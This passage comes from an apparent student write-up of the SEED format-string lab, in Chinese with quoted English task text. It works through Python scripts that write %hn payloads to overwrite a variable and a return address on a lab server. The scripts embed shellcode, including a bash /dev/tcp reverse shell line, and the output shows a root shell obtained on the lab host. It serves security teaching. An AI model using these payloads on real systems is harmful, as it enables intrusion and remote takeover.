f.write(content)<br><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0000000000005dcThe</span> target variable&#x27;s value (after):  <span class="hljs-number">0x00005000</span><br>server-<span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> | (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)  Returned properly (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)<br></code></pre></td></tr></table></figure><h2 id="Task-3-C"><a href="#Task-3-C" class="headerlink" title="Task 3.C"></a>Task 3.C</h2><p>Change the value to 0xAABBCCDD. This sub-task is similar to the previous one, except<br>that the target value is now a large number. In a format string attack, this value is the total number of<br>characters that are printed out by the printf() function; printing out this large number of characters<br>may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of<br>%n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 216<br>characters does not take much time. More details can be found in the SEED book</p><p>将值更改为0xAABBCCDD</p><p>先看一下0x080e5068内存组织，由于是小端存储，因此：</p><ul><li>AA 0x080e506b </li><li>BB 0x080e506a</li><li>CC 0x080e5069 </li><li>DD 0x080e5068</li></ul><p>先说结论：<code>data = &quot;%.8x&quot;*62 + &quot;%.43199x&quot; + &quot;%hn&quot; + &quot;%.8738x&quot; + &quot;%hn&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303291557522.png"></p><p>这个图给出了填充字符串的大致雏形</p><ul><li>地址A：需要更改的内存高位，为0x080e506a</li><li>@@@@：对应后面%hn**%x**%hn</li><li>地址B：需要更改的内存低位，为0x080e5068</li><li>%.8x，输出字符，并且移动指针</li><li>%hn：对应地址A</li><li>%x：对应@@@@</li><li>%hn：对应地址B</li></ul><p>AABB-12=43695</p><ul><li>“%.8x”*62将指针向上移动62次，并输出496个字符。43695-496=43199</li><li>“%.43199x”打印出43199个字符，并将指针向上移动1次</li><li>%hn改变地址内容的的2个字节，并将指针向上移动1次</li><li>“%.8738x”打印出8738个字符，并将指针向上移动1次</li><li>%hn改变地址内容的的2个字节，并将指针向上移动1次</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>add1  = <span class="hljs-number">0x080e5068</span><br>add2  = <span class="hljs-number">0x080e5068</span>+<span class="hljs-number">2</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (add2).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-comment">#AAAA</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (add1).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.43199x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.8738x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041414141The</span> target variable&#x27;s value (after):  <span class="hljs-number">0xaabbccdd</span><br>server-<span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> | (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)  Returned properly (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)<br></code></pre></td></tr></table></figure><h1 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h1><p>将一段恶意代码，以二进制格式注入到服务器的内存中，然后使用格式字符串漏洞修改函数的返回地址字段，因此当函数返回时，它跳转到我们注入的代码。这个任务使用的技术与前一个任务相似: 它们都修改内存中的4字节数。前一个任务修改目标变量，而此任务修改函数的返回地址字段</p><h2 id="Understanding-the-Stack-Layout"><a href="#Understanding-the-Stack-Layout" class="headerlink" title="Understanding the Stack Layout"></a>Understanding the Stack Layout</h2><p>首先，我们需要根据服务器打印出来的信息计算出返回地址字段的地址</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303291653197.png"></p><h3 id="Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3"><a href="#Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3" class="headerlink" title="Question 1: What are the memory addresses at the locations marked by 2 and 3"></a>Question 1: What are the memory addresses at the locations marked by 2 and 3</h3><p>2：ebp+4=0xffffd538+4=FFFFD53C（myprintf返回地址）</p><p>3 ：0xffffd610（buffer的地址）</p><blockquote><p>Frame Pointer (inside myprintf):      0xffffd538</p><p>The input buffer’s address:    0xffffd610</p></blockquote><h3 id="Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-？-Remember-the-argument-pointer-starts-from-the-location-above-1"><a href="#Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-？-Remember-the-argument-pointer-starts-from-the-location-above-1" class="headerlink" title="Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3 ？ Remember, the argument pointer starts from the location above  1"></a>Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3 ？ Remember, the argument pointer starts from the location above  1</h3><p>64</p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>这里地址要计算正确，十六进制减十进制被Windows自带的计算器坑惨了nnnd</p><ul><li><strong>buf的地址：0xffffd610</strong></li><li>shellcode的地址：0xffffd610+0d1364=0xffffdb64</li><li>ebp的地址：0xffffd538</li><li><strong>返回地址：0xffffd538+0x4=0xFFFFD53C</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)       <span class="hljs-comment">#0d1364       </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br> <span class="hljs-comment">#        ffff                 db64</span><br><span class="hljs-comment">#0xFFFFD53C+2            0xFFFFD53C</span><br><br>ret_addr=<span class="hljs-number">0xFFFFD53C</span><br><br>ret_addr_low=ret_addr     <span class="hljs-comment"># DA90</span><br>ret_addr_high=ret_addr+<span class="hljs-number">2</span>  <span class="hljs-comment"># FFFF</span><br><br><span class="hljs-comment">#change retaddr into 0xffffd610+0d1364=0xffff DA90</span><br><br><span class="hljs-comment"># new_ret=ret_addr+1364</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]=(ret_addr_low).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]=(<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&quot;latin-1&quot;</span>)<br><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]=(ret_addr_high).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-comment">#0xDA90-12-8*62=55952-508=55444</span><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.55444x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.9583x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">�KP�CT�KH1�1��5 | �KL�K<br>              �����/bin/bash*-c*/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *AAAABBBBCCCCDDDDThe target variable&#x27;s value (after):  0x11223344<br>server-10.9.0.5 | total 832<br>server-10.9.0.5 | -rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 319488 </span>Mar<span class="hljs-number"> 29 </span>13:23 core<br>server-10.9.0.5 | -rwxrwxr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 709340 </span>Mar<span class="hljs-number"> 27 </span>07:43 format<br>server-10.9.0.5 | -rwxrwxr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 17880 </span>Mar<span class="hljs-number"> 27 </span>07:43 server<br>server-10.9.0.5 | ===== Success! ======<br><br></code></pre></td></tr></table></figure><p>根据回显可以确定触发了/bin/ls命令</p><h2 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell"></a>Getting a Reverse Shell</h2><p> We are not interested in running some pre-determined commands. We want<br>to get a root shell on the target server, so we can type any command we want. Since we are on a remote<br>machine, if we simply get the server to run /bin/bash, we won’t be able to control the shell program.<br>Reverse shell is a typical technique to solve this problem. Section 9 provides detailed instructions on how<br>to run a reverse shell. Please modify the command string in your shellcode, so you can get a reverse shell<br>on the target server. Please include screenshots and explanation in your lab report.</p><p>供给端ip为inet 10.9.0.1</p><p>攻击端运行<code>nc -l 9090 -nv</code>等待reverse shell</p><p>更改py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br> <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>    <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <br> <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)       <span class="hljs-comment">#0d1364       </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br> <span class="hljs-comment">#        ffff                 db64</span><br><span class="hljs-comment">#0xFFFFD53C+2            0xFFFFD53C</span><br><br>ret_addr=<span class="hljs-number">0xFFFFD53C</span><br><br>ret_addr_low=ret_addr     <span class="hljs-comment"># DA90</span><br>ret_addr_high=ret_addr+<span class="hljs-number">2</span>  <span class="hljs-comment"># FFFF</span><br><br><span class="hljs-comment">#change retaddr into 0xffffd610+0d1364=0xffff DA90</span><br><br><span class="hljs-comment"># new_ret=ret_addr+1364</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]=(ret_addr_low).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]=(<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&quot;latin-1&quot;</span>)<br><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]=(ret_addr_high).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-comment">#0xDA90-12-8*62=55952-508=55444</span><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.55444x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.9583x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">5</span> <span class="hljs-number">58502</span><br>root<span class="hljs-variable">@d21da27aa2b7</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h1><ul><li><p><strong>The input buffer’s address: 0x00007fffffffe540</strong></p></li><li><p><strong>Frame Pointer (inside myprintf): 0x00007fffffffe480</strong></p></li></ul><p>输入：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">echo AAAA-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>- | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.6</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span>-<span class="hljs-number">555592</span>a<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">39</span>-<span class="hljs-number">90</span>-ffffe<span class="hljs-number">540</span>-<span class="hljs-number">0</span>-ffffe<span class="hljs-number">480</span>-ffffe<span class="hljs-number">510</span>-<span class="hljs-number">55555383</span>-<span class="hljs-number">5</span>dc-ffffe<span class="hljs-number">540</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>c<span class="hljs-number">09500</span>-ffffeb<span class="hljs-number">30</span>-<span class="hljs-number">5555531</span>b-ffffec<span class="hljs-number">28</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure><p>保存到tmp中，grep一下，发现偏移为34</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">~$ grep -o &#x27;-&#x27; tmp | wc - l<br>    <span class="hljs-number"> 34 </span>    <span class="hljs-number"> 34 </span>    <span class="hljs-number"> 68 </span>-<br></code></pre></td></tr></table></figure><p>printf遇到0会终止输出，由于64位的地址都会有0，所以地址应该放在字符串的后面</p><p>找到shellcode的地址，并格式化输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">shellcode_addr</span>=start+buf<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%shellcode_addr) <br></code></pre></td></tr></table></figure><p><strong>shellcode_addr：0x7fffffffea77</strong></p><p>使用%hn每次更改两字节，我们需要以下三个地址</p> <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 